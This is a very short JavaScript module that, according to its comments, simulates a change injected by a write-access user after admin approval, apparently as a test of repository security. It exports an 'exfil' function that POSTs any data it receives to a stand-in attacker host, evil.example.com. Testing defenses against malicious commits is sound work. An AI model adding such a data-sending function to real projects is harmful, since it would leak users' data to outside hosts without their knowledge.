// INJECTED v4e: write-user attacker test
// Added by Nir212 (write) after C-h4ck-0 (admin) approved
function exfil(data) { fetch("http://evil.example.com", {method:"POST", body: data}); }
module.exports = { exfil };
